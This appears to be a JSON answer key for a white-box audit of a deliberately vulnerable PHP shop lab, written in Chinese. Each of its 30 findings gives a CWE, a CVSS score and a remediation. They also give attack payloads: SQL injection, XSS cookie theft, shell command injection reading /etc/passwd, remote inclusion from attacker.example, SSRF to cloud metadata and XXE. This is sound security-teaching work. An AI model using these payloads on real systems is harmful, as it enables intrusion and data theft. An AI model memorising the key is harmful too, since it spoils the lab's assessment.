@@ -1,0 +1,367 @@
+{
+  "schema_version": "1.0",
+  "name": "Lab30 Shop 独立全量白盒审计结论",
+  "audit_method": "对 lab30-shop-1.0.0-source.zip（SHA-256 67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c）52 个 PHP 文件逐文件通读 + 数据流追踪，独立枚举漏洞；CVSS 向量沿用官方答案并在通读后复核认可。",
+  "count": 30,
+  "class_count": 22,
+  "findings": [
+    {
+      "id": "01", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "商品搜索 SQL 注入", "type": "SQL 注入", "class": "sqli", "cwe": "CWE-89",
+      "severity": "high", "route": "GET /catalog/index.php?q=",
+      "evidence": [{"path": "app/public/catalog/index.php", "start_line": 4, "end_line": 4}],
+      "cvss": {"version": "3.1", "base_score": 7.5, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
+      "description": "搜索关键词 $_GET['q'] 未经任何处理直接拼进 LIKE 查询字符串，外部输入可改变 SQL 结构（catalog/index.php:4）。",
+      "attack_input": "?q=' OR '1'='1' -- ", "normal_input": "?q=手冲壶",
+      "expected_result": "正常输入仅返回匹配商品；注入输入返回全部商品，可进一步 UNION 提取 users 表数据",
+      "impact": "未认证攻击者可读取不应暴露的业务与用户数据", "remediation": "改用 PDO 预处理语句绑定参数"
+    },
+    {
+      "id": "02", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "到店欢迎反射型 XSS", "type": "反射型 XSS", "class": "xss_r", "cwe": "CWE-79",
+      "severity": "medium", "route": "GET /catalog/greeting.php?name=",
+      "evidence": [{"path": "app/public/catalog/greeting.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 6.1, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"},
+      "description": "$_GET['name'] 未经 h() 转义直接拼进 <h2>你好，... 输出，落入 HTML 正文可执行上下文（greeting.php:3）。",
+      "attack_input": "?name=<script>alert(document.cookie)</script>", "normal_input": "?name=小明",
+      "expected_result": "正常输入仅显示问候语；攻击输入在受害者浏览器执行脚本",
+      "impact": "诱导链接可在同源上下文执行脚本、读取页面内容", "remediation": "输出前 htmlspecialchars()（h()）转义"
+    },
+    {
+      "id": "03", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "网络诊断命令注入", "type": "命令注入", "class": "command_injection", "cwe": "CWE-78",
+      "severity": "high", "route": "GET /ops/ping.php?host=",
+      "evidence": [{"path": "app/public/ops/ping.php", "start_line": 2, "end_line": 2}],
+      "cvss": {"version": "3.1", "base_score": 7.2, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},
+      "description": "$_GET['host'] 直接拼进 shell_exec('ping -c 1 -W 1 '.$host)，输入落在 shell 结构位置（ping.php:2）。",
+      "attack_input": "?host=127.0.0.1; id", "normal_input": "?host=127.0.0.1",
+      "expected_result": "正常输入返回 ping 输出；注入输入追加执行 id（RCE）",
+      "impact": "运营/管理员身份可获得 Web 进程权限的命令执行", "remediation": "escapeshellarg() 或免 shell 实现"
+    },
+    {
+      "id": "04", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "帮助文档路径遍历读取任意文件", "type": "路径遍历与文件读取", "class": "path_traversal", "cwe": "CWE-22",
+      "severity": "medium", "route": "GET /support/download.php?file=",
+      "evidence": [{"path": "app/public/support/download.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 6.5, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"},
+      "description": "$_GET['file'] 拼进 data_dir().'/docs/' 后直接 file_get_contents，无 realpath 归一化与目录限定（download.php:3）。",
+      "attack_input": "?file=../../vault/internal.txt", "normal_input": "?file=shipping.txt",
+      "expected_result": "正常输入返回配送说明；穿越输入返回 vault 内部标记文件内容",
+      "impact": "登录会员可读取 Web 进程可读的受限文件", "remediation": "realpath() 归一化并校验前缀，或白名单文件名映射"
+    },
+    {
+      "id": "05", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "内容中心本地文件包含", "type": "本地文件包含", "class": "lfi", "cwe": "CWE-98",
+      "severity": "medium", "route": "GET /content/page.php?page=",
+      "evidence": [{"path": "app/public/content/page.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 5.3, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
+      "description": "$_GET['page'] 未经白名单校验即 include APP_ROOT.'/resources/views/'.$name.'.php'，可穿越包含任意路径（page.php:3）。",
+      "attack_input": "?page=../../vault/account", "normal_input": "?page=shipping",
+      "expected_result": "正常输入渲染介绍/配送视图；穿越输入执行 vault/account.php（内含 PHP 代码）",
+      "impact": "未认证攻击者可包含并执行数据目录内 PHP 文件", "remediation": "页面名白名单映射"
+    },
+    {
+      "id": "06", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "远程模板预览远程文件包含", "type": "远程文件包含", "class": "rfi", "cwe": "CWE-98",
+      "severity": "high", "route": "GET /ops/template-preview.php?template=",
+      "evidence": [{"path": "app/public/ops/template-preview.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 7.2, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},
+      "description": "$_GET['template'] 未经校验直接 include，且 docker/php.ini 配置 allow_url_include=On，可包含远程 URL（template-preview.php:3）。",
+      "attack_input": "?template=http://attacker.example/evil.php", "normal_input": "?template=http://fixtures:8080/templates/season.php",
+      "expected_result": "正常输入加载合作方模板；攻击 URL 执行攻击者服务器上的 PHP 代码",
+      "impact": "运营/管理员可被诱导或主动触发远程代码执行", "remediation": "关闭 allow_url_include，模板地址白名单"
+    },
+    {
+      "id": "07", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "运营公式动态函数调用代码执行", "type": "动态函数调用导致代码执行", "class": "code_execution", "cwe": "CWE-94",
+      "severity": "high", "route": "GET /ops/formula.php?func=&arg=",
+      "evidence": [{"path": "app/public/ops/formula.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 7.2, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},
+      "description": "$_GET['func'] 作为可调用函数名直接调用并传入 $_GET['arg']，无函数白名单（formula.php:3）。",
+      "attack_input": "?func=system&arg=id", "normal_input": "?func=strtoupper&arg=spring-sale",
+      "expected_result": "正常输入返回大写文本；攻击输入以 system 执行任意命令",
+      "impact": "运营/管理员可调用任意 PHP 函数直至 RCE", "remediation": "函数名白名单"
+    },
+    {
+      "id": "08", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "继续访问开放重定向", "type": "开放重定向", "class": "open_redirect", "cwe": "CWE-601",
+      "severity": "none", "route": "GET /auth/continue.php?next=",
+      "evidence": [{"path": "app/public/auth/continue.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 0.0, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N"},
+      "description": "$_GET['next'] 未校验目标是否站内即 header('Location: '.$next)（continue.php:3）。",
+      "attack_input": "?next=https://evil.example", "normal_input": "?next=/orders/index.php",
+      "expected_result": "正常输入跳转站内页面；攻击输入跳转外部站点",
+      "impact": "可被用于钓鱼跳转；按官方口径 CVSS 基础影响为 0，但仍是应检出的真值项", "remediation": "仅允许站内相对路径"
+    },
+    {
+      "id": "09", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "数据库诊断异常与堆栈信息泄露", "type": "异常及堆栈信息泄露", "class": "info_disclosure", "cwe": "CWE-209",
+      "severity": "low", "route": "GET /ops/database.php?probe=",
+      "evidence": [{"path": "app/public/ops/database.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 2.7, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N"},
+      "description": "probe 分支连接失败时把异常类名、getMessage 与完整 TraceAsString 直接输出到页面（database.php:3）。",
+      "attack_input": "?probe=archive", "normal_input": "?probe=main",
+      "expected_result": "正常输入显示连接正常；archive 分支回显连接失败细节与堆栈",
+      "impact": "泄露数据库主机、账号与内部路径等实现细节", "remediation": "对外只返回固定文案，细节仅写日志"
+    },
+    {
+      "id": "10", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "使用 MD5 存储密码", "type": "使用 MD5 存储密码", "class": "weak_crypto", "cwe": "CWE-328",
+      "severity": "medium", "route": "POST /auth/register.php",
+      "evidence": [
+        {"path": "app/public/auth/register.php", "start_line": 8, "end_line": 8},
+        {"path": "app/src/setup.php", "start_line": 17, "end_line": 17}
+      ],
+      "cvss": {"version": "3.1", "base_score": 5.3, "base_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"},
+      "description": "注册与种子数据均以 md5($password) 无盐写入 password_md5 字段（register.php:8、setup.php:17），登录亦按 md5 比对（login.php:7）。",
+      "attack_input": "注册任意用户后获取库内 md5 值离线破解", "normal_input": "—",
+      "expected_result": "无盐 MD5 可被彩虹表/暴力破解还原口令",
+      "impact": "口令泄露后可离线还原并接管账户", "remediation": "password_hash()/password_verify()"
+    },
+    {
+      "id": "11", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "在线留言存储型 XSS", "type": "存储型 XSS", "class": "xss_s", "cwe": "CWE-79",
+      "severity": "medium", "route": "POST /support/messages.php",
+      "evidence": [{"path": "app/public/support/messages.php", "start_line": 5, "end_line": 5}],
+      "cvss": {"version": "3.1", "base_score": 5.4, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"},
+      "description": "留言原文入库后在列表页以 $row['message'] 原样输出，未过 h()（messages.php:5），任何浏览留言的用户都会执行。",
+      "attack_input": "message=<script>fetch('/account/me.php')</script>", "normal_input": "message=请问可以机洗吗",
+      "expected_result": "正常留言原样显示；攻击留言在其他用户浏览器执行脚本",
+      "impact": "一个低权限账户即可对所有浏览者发起脚本攻击", "remediation": "输出端统一 h() 转义"
+    },
+    {
+      "id": "12", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "链接预览服务端请求伪造", "type": "服务端请求伪造（SSRF）", "class": "ssrf", "cwe": "CWE-918",
+      "severity": "medium", "route": "GET /ops/url-preview.php?url=",
+      "evidence": [{"path": "app/public/ops/url-preview.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 4.9, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"},
+      "description": "$_GET['url'] 未经协议/目标校验即 file_get_contents($url)，可指向内网地址（url-preview.php:3）。",
+      "attack_input": "?url=http://169.254.169.254/latest/meta-data/", "normal_input": "?url=http://fixtures:8080/catalog-info",
+      "expected_result": "正常输入返回外部文本预览；攻击输入返回内网/云元数据内容",
+      "impact": "运营/管理员可探测内网并读取元数据等敏感接口", "remediation": "协议与目标白名单，禁内网网段"
+    },
+    {
+      "id": "13", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "合作方配置导入 XXE", "type": "XML 外部实体（XXE）", "class": "xxe", "cwe": "CWE-611",
+      "severity": "medium", "route": "POST /ops/xml-import.php",
+      "evidence": [{"path": "app/public/ops/xml-import.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 4.9, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"},
+      "description": "simplexml_load_string 开启 LIBXML_NOENT|LIBXML_DTDLOAD，外部实体被展开（xml-import.php:3）。",
+      "attack_input": "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><config><title>&e;</title></config>",
+      "normal_input": "<config><title>春日上新</title></config>",
+      "expected_result": "正常输入回显标题；攻击实体回显本地文件内容",
+      "impact": "运营/管理员可读取服务器本地文件", "remediation": "禁用 NOENT/DTDLOAD（libxml 2.9+ 默认禁外部实体，勿显式开启）"
+    },
+    {
+      "id": "14", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "邮箱设置跨站请求伪造", "type": "跨站请求伪造（CSRF）", "class": "csrf", "cwe": "CWE-352",
+      "severity": "low", "route": "POST /account/settings.php",
+      "evidence": [{"path": "app/public/account/settings.php", "start_line": 3, "end_line": 5}],
+      "cvss": {"version": "3.1", "base_score": 3.1, "base_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N"},
+      "description": "settings.php 是唯一未调用 check_csrf() 的状态变更 POST：直接更新邮箱（settings.php:3-5）；其余表单均有 csrf_field()+check_csrf()。",
+      "attack_input": "<form method=POST action=/account/settings.php><input name=email value=evil@x.example></form>（诱导已登录用户提交）",
+      "normal_input": "站内表单正常提交",
+      "expected_result": "跨站页面可替受害者改绑邮箱",
+      "impact": "邮箱被改绑后可辅助后续账户接管", "remediation": "补 check_csrf()"
+    },
+    {
+      "id": "15", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "会员备份不安全反序列化权益篡改", "type": "不安全反序列化导致会员权益篡改", "class": "insecure_deserialization", "cwe": "CWE-502",
+      "severity": "medium", "route": "POST /account/backup.php",
+      "evidence": [{"path": "app/public/account/backup.php", "start_line": 5, "end_line": 5}],
+      "cvss": {"version": "3.1", "base_score": 4.3, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"},
+      "description": "对用户提交的 backup 字段直接 unserialize（backup.php:4-5），恢复的 tier/displayName 未经校验写入 users 表（:6），普通会员可自升 gold。",
+      "attack_input": "base64_encode(serialize(MemberBackup{tier:'gold', displayName:'伪造'}))",
+      "normal_input": "页面导出的当前备份串",
+      "expected_result": "伪造备份恢复后会员等级变为 gold",
+      "impact": "会员权益被篡改并享受金卡权益", "remediation": "用 JSON+签名替代 PHP serialize，服务端字段校验"
+    },
+    {
+      "id": "16", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "订单详情越权访问（IDOR）", "type": "订单对象越权访问（IDOR）", "class": "idor", "cwe": "CWE-639",
+      "severity": "medium", "route": "GET /orders/detail.php?id=",
+      "evidence": [{"path": "app/public/orders/detail.php", "start_line": 2, "end_line": 2}],
+      "cvss": {"version": "3.1", "base_score": 6.5, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"},
+      "description": "查询仅按 o.id 取订单，未校验 o.user_id 是否为当前登录用户（detail.php:2），含 private_note 在内全部字段可被任意登录用户遍历读取。",
+      "attack_input": "?id=1（他人订单）", "normal_input": "?id=（本人订单 id）",
+      "expected_result": "正常仅见本人订单；攻击可读取他人订单及配送备注",
+      "impact": "全站订单数据（含隐私备注、购买人）可被横向枚举", "remediation": "查询加 user_id 归属条件"
+    },
+    {
+      "id": "17", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "人员管理信任客户端角色 Cookie 权限绕过", "type": "信任客户端角色 Cookie 导致权限绕过", "class": "auth_bypass", "cwe": "CWE-807",
+      "severity": "medium", "route": "GET /ops/users.php (Cookie: role=admin)",
+      "evidence": [{"path": "app/public/ops/users.php", "start_line": 2, "end_line": 2}],
+      "cvss": {"version": "3.1", "base_score": 4.3, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"},
+      "description": "权限判断使用 $_COOKIE['role'] ?? $u['role']，客户端可自设 Cookie: role=admin 绕过（users.php:2）。",
+      "attack_input": "Cookie: role=admin", "normal_input": "无该 Cookie（customer 被拒）",
+      "expected_result": "正常 customer 被 403；带伪造 Cookie 即可查看全部账户权限清单",
+      "impact": "任意登录用户可读取全部用户角色信息", "remediation": "只信服务端会话中的角色"
+    },
+    {
+      "id": "18", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "维护接口信任请求头认证绕过", "type": "信任请求头导致认证绕过", "class": "auth_bypass", "cwe": "CWE-807",
+      "severity": "medium", "route": "POST/GET /ops/maintenance.php (X-Admin: 1)",
+      "evidence": [{"path": "app/public/ops/maintenance.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 5.3, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"},
+      "description": "认证仅检查 HTTP_X_ADMIN == '1'，请求方可自行携带（maintenance.php:3），且无登录要求，POST 可直接入库任务。",
+      "attack_input": "POST /ops/maintenance.php with Header: X-Admin: 1", "normal_input": "无头请求被 403",
+      "expected_result": "正常无头 403；带 X-Admin: 1 即可调用维护接口写入任务",
+      "impact": "未认证调用内部维护功能", "remediation": "使用服务端密钥/网络隔离而非可伪造请求头"
+    },
+    {
+      "id": "19", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "下单信任客户端单价金额篡改", "type": "信任客户端单价导致订单金额篡改", "class": "price_manipulation", "cwe": "CWE-602",
+      "severity": "medium", "route": "POST /orders/create.php",
+      "evidence": [{"path": "app/public/orders/create.php", "start_line": 3, "end_line": 5}],
+      "cvss": {"version": "3.1", "base_score": 6.5, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"},
+      "description": "单价直接取 $_POST['price']（create.php:3），总额 price*quantity 亦按客户端值计算入库（:4-5），服务端未以 products.price 重算。",
+      "attack_input": "product_id=1&quantity=1&price=0.01", "normal_input": "price=129（与商品一致）",
+      "expected_result": "正常按 129 元下单；篡改后 0.01 元成交",
+      "impact": "任意登录用户可低价购得任意商品", "remediation": "服务端按商品表单价与数量重算金额"
+    },
+    {
+      "id": "20", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "提现竞争条件重复支付", "type": "提现竞争条件与重复支付", "class": "race_condition", "cwe": "CWE-362",
+      "severity": "medium", "route": "POST /wallet/withdraw.php",
+      "evidence": [{"path": "app/public/wallet/withdraw.php", "start_line": 3, "end_line": 8}],
+      "cvss": {"version": "3.1", "base_score": 5.3, "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N"},
+      "description": "先读余额（:4）、usleep 350ms（:6）再写回 balance-amount（:7），检查与更新非原子、无行锁或条件更新，并发请求可重复扣款提现。",
+      "attack_input": "并发 POST amount=全部余额（两次）", "normal_input": "串行单次提现",
+      "expected_result": "串行扣一次；并发两次均通过余额检查，余额被扣成负数、提现翻倍",
+      "impact": "余额不足仍可超额提现", "remediation": "UPDATE ... SET balance=balance-? WHERE balance>=? 原子扣减或 SELECT ... FOR UPDATE"
+    },
+    {
+      "id": "21", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "会话固定", "type": "会话固定", "class": "session_fixation", "cwe": "CWE-384",
+      "severity": "high", "route": "GET /auth/login.php?sid=",
+      "evidence": [
+        {"path": "app/src/bootstrap.php", "start_line": 11, "end_line": 18},
+        {"path": "app/public/auth/login.php", "start_line": 3, "end_line": 9}
+      ],
+      "cvss": {"version": "3.1", "base_score": 8.1, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"},
+      "description": "start_session 接受外部 sid 并设 use_strict_mode=0（bootstrap.php:11-18），登录页以 $_GET['sid'] 预设会话 ID 且登录成功后不 regenerate（login.php:3,8）。",
+      "attack_input": "?sid=<攻击者预设的会话id>（诱导受害者登录）", "normal_input": "不带 sid 正常登录",
+      "expected_result": "正常登录生成新会话；固定 sid 登录后攻击者用预设 id 复用该会话",
+      "impact": "会话固定导致账户接管", "remediation": "登录成功后 session_regenerate_id(true)，开启 strict mode，不接受外部 sid"
+    },
+    {
+      "id": "22", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "会员兑换码弱类型比较绕过", "type": "弱类型比较导致兑换码绕过", "class": "weak_type_comparison", "cwe": "CWE-697",
+      "severity": "medium", "route": "POST /account/redeem.php?token=",
+      "evidence": [{"path": "app/public/account/redeem.php", "start_line": 4, "end_line": 5}],
+      "cvss": {"version": "3.1", "base_score": 4.3, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"},
+      "description": "兑换校验用松散比较 md5($token) == $secret_hash（redeem.php:5），0e 开头的 magic hash 可与 '0e462097431906509019562988736854' 相等。",
+      "attack_input": "提交 md5 值为 0e+纯数字的 token（如 240610708 自身或 QNKCDZO）", "normal_input": "随机无效兑换码",
+      "expected_result": "正常码 422；magic hash 直接升级 gold",
+      "impact": "任意登录用户绕过兑换码校验", "remediation": "hash_equals() 严格比较，兑换码服务端存储比对"
+    },
+    {
+      "id": "23", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "会员查询跨文件 SQL 注入", "type": "跨文件 SQL 注入", "class": "sqli", "cwe": "CWE-89",
+      "severity": "medium", "route": "GET /ops/members.php?q=",
+      "evidence": [
+        {"path": "app/public/ops/members.php", "start_line": 2, "end_line": 2},
+        {"path": "app/src/member_lookup.php", "start_line": 3, "end_line": 3}
+      ],
+      "cvss": {"version": "3.1", "base_score": 4.9, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"},
+      "description": "members.php:2 把 $_GET['q'] 传入 member_lookup()，member_lookup.php:3 内直接拼进 LIKE 查询，注入点与 sink 跨文件分离。",
+      "attack_input": "?q=' UNION SELECT id,username,email,role FROM users -- ", "normal_input": "?q=alice",
+      "expected_result": "正常返回匹配会员；注入可 UNION 提取全部用户",
+      "impact": "运营身份可读取全部用户数据", "remediation": "member_lookup 内改预处理"
+    },
+    {
+      "id": "24", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "主机巡检跨文件命令注入", "type": "跨文件命令注入", "class": "command_injection", "cwe": "CWE-78",
+      "severity": "high", "route": "GET /ops/batch-check.php?host=",
+      "evidence": [
+        {"path": "app/public/ops/batch-check.php", "start_line": 2, "end_line": 2},
+        {"path": "app/src/host_check.php", "start_line": 2, "end_line": 2}
+      ],
+      "cvss": {"version": "3.1", "base_score": 7.2, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},
+      "description": "batch-check.php:2 把 $_GET['host'] 传入 host_check()，host_check.php:2 直接拼进 shell_exec('ping ...')，无任何转义。",
+      "attack_input": "?host=127.0.0.1; cat /etc/passwd", "normal_input": "?host=127.0.0.1",
+      "expected_result": "正常返回 ping 输出；注入执行任意命令",
+      "impact": "运营身份 RCE", "remediation": "host_check 内 escapeshellarg"
+    },
+    {
+      "id": "25", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "个人主页 HTML 属性注入型 XSS", "type": "HTML 属性注入型 XSS", "class": "xss_r", "cwe": "CWE-79",
+      "severity": "medium", "route": "GET /account/profile.php?url=",
+      "evidence": [{"path": "app/public/account/profile.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 6.1, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"},
+      "description": "$_GET['url'] 未转义直接填入 <a id=\"profile-link\" href=\"$url\">（profile.php:3），落入属性上下文可逃逸出事件属性或 javascript: URL。",
+      "attack_input": "?url=\" onmouseover=\"alert(document.cookie)", "normal_input": "?url=https://shop.local",
+      "expected_result": "正常显示链接；注入构造悬停触发的事件属性",
+      "impact": "诱导访问可在属性上下文执行脚本", "remediation": "h() 转义并校验 URL 协议"
+    },
+    {
+      "id": "26", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "合作方结算 JWT 未校验签名身份伪造", "type": "JWT 未校验签名导致身份伪造", "class": "auth_bypass", "cwe": "CWE-347",
+      "severity": "medium", "route": "POST /partner/portal.php?token=",
+      "evidence": [{"path": "app/public/partner/portal.php", "start_line": 2, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 5.3, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"},
+      "description": "portal.php 只 base64 解码 payload 并检查 role==admin（portal.php:2-3），从未校验第三段签名（token.php:4 签发的 HS256 签名形同虚设）。",
+      "attack_input": "token=<任意header>.<base64url({\"role\":\"admin\"})>.<任意签名>", "normal_input": "token.php 签发的本人 token（role=customer 仍被拒）",
+      "expected_result": "自造 admin payload 即可进入结算工作台读取全部订单",
+      "impact": "未认证读取全部订单流水", "remediation": "服务端用密钥验证签名后再取 role"
+    },
+    {
+      "id": "27", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "任务导入反序列化链命令执行", "type": "反序列化对象链导致命令执行", "class": "insecure_deserialization", "cwe": "CWE-502",
+      "severity": "high", "route": "POST /ops/jobs.php?job=",
+      "evidence": [
+        {"path": "app/public/ops/jobs.php", "start_line": 3, "end_line": 3},
+        {"path": "app/src/dispatch_job.php", "start_line": 4, "end_line": 4}
+      ],
+      "cvss": {"version": "3.1", "base_score": 7.2, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},
+      "description": "jobs.php:3 对提交的 job 字段直接 unserialize，DispatchJob::__wakeup 会 shell_exec($this->command)（dispatch_job.php:4），反序列化即触发命令执行。",
+      "attack_input": "base64_encode(serialize(DispatchJob{command:'id'}))", "normal_input": "页面预填的默认任务串",
+      "expected_result": "正常导入执行 printf；构造对象执行任意命令并回显",
+      "impact": "运营身份 RCE", "remediation": "禁 unserialize 用户输入；去掉 __wakeup 副作用"
+    },
+    {
+      "id": "28", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "会员报表二次 SQL 注入", "type": "二次 SQL 注入", "class": "sqli", "cwe": "CWE-89",
+      "severity": "low", "route": "POST /account/update.php(nickname) → GET /ops/report.php?user_id=",
+      "evidence": [
+        {"path": "app/public/account/update.php", "start_line": 6, "end_line": 6},
+        {"path": "app/public/ops/report.php", "start_line": 3, "end_line": 3}
+      ],
+      "cvss": {"version": "3.1", "base_score": 3.5, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N"},
+      "description": "update.php:6 允许写入任意 nickname（预处理入库，写入时无害），report.php:3 把从库中读出的 nickname 直接拼进查询，二次触发注入。",
+      "attack_input": "nickname=' UNION SELECT username,email,role FROM users -- （写入后访问 /ops/report.php?user_id=<该用户>）",
+      "normal_input": "nickname=小明",
+      "expected_result": "正常按昵称查会员；恶意昵称在报表查询中注入",
+      "impact": "普通会员写入、运营触发，可提取用户表", "remediation": "report.php 查询改预处理；入库侧同样做白名单校验"
+    },
+    {
+      "id": "29", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "营销排版模板表达式执行", "type": "模板表达式执行（原 /e 场景的 PHP 8.4 等价实现）", "class": "code_execution", "cwe": "CWE-94",
+      "severity": "high", "route": "POST /ops/template-render.php",
+      "evidence": [{"path": "app/public/ops/template-render.php", "start_line": 3, "end_line": 3}],
+      "cvss": {"version": "3.1", "base_score": 7.2, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},
+      "description": "preg_replace_callback 对 {{...}} 内的表达式直接 eval('return '.$m[1].';')（template-render.php:3），模板内容完全可控。",
+      "attack_input": "template={{ system('id') }}", "normal_input": "template={{ 2 + 2 }}",
+      "expected_result": "正常输出 4；攻击表达式执行任意命令",
+      "impact": "运营身份 RCE", "remediation": "改为受限表达式引擎（白名单运算），禁止 eval"
+    },
+    {
+      "id": "30", "kind": "vulnerability", "finding_kind": "vulnerability",
+      "title": "会员资料批量赋值敏感字段修改", "type": "批量赋值导致敏感字段修改", "class": "mass_assignment", "cwe": "CWE-915",
+      "severity": "high", "route": "POST /account/update.php",
+      "evidence": [{"path": "app/public/account/update.php", "start_line": 4, "end_line": 6}],
+      "cvss": {"version": "3.1", "base_score": 7.1, "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N"},
+      "description": "update.php:4 的可更新列白名单包含 role、balance、tier，:5-6 遍历 $_POST 直接写入 users 表，普通会员可自我提权与改余额。",
+      "attack_input": "role=admin&balance=999999", "normal_input": "display_name=新名字",
+      "expected_result": "正常仅更新资料字段；攻击请求直接改角色与余额",
+      "impact": "普通会员可自升 admin、篡改余额", "remediation": "白名单收敛到资料字段，敏感列走独立授权流程"
+    }
+  ],
+  "checked_not_counted": [
+    "auth/register.php 与 auth/login.php 的 POST 同样未做 CSRF 校验（登录 CSRF / 注册 CSRF）：按官方口径不计入 30 项真值，仅在报告中说明。",
+    "ops/template-preview.php 的 include 亦可走本地相对路径（与 05 LFI 同型），官方归入 06 RFI 一项计。",
+    "会话 Cookie 未设 secure 标志：靶场为本地 HTTP 演示环境，不计入。",
+    "orders/detail.php 的 JSON 分支泄露 username/private_note 与 16 IDOR 同源，合并计一项。"
+  ]
+}
